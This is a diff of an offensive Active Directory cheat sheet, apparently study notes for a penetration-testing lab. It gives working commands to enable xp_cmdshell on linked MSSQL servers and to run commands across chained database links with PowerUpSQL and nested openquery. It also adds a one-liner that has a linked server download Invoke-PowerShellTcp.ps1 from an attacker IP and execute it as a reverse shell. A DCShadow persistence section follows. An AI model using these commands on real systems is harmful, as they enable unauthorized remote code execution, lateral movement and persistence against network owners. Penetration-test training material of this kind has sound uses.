@@ -1072,16 +1072,19 @@ Now -
 Turn xp_cmdshell on:
 ```EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"```
 
-```Get-SQLServerLinkCrawl -Instance ecorp-mssql  -Query "exec master..xp_cmdshell 'whoami'"```
+```Get-SQLServerLinkCrawl -Instance db01-mssql  -Query "exec master..xp_cmdshell 'whoami'"```
 
 OR via SQL:
 
 ```
-select * from openquery("dcorp-sql1",'select * from openquery("dcorp- mgmt",''select * from openquery("eu-sql",''''select @@version as version; exec master..xp_cmdshell "powershell whoami)'''')'')')
+select * from openquery("db01-mssql",'select * from openquery("db-mgmt",''select * from openquery("externalnet-mssql",''''select @@version as version; exec master..xp_cmdshell "powershell whoami)'''')'')')
 ```
 
+send back a shell:
 
-
+```
+Get-SQLServerLinkCrawl -Instance db01-mssql.ecorp.bcorp.lab -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1'')"'
+```
 
 # Forest Persistence - DCShadow
 ```Set-DCShadowPermissions```
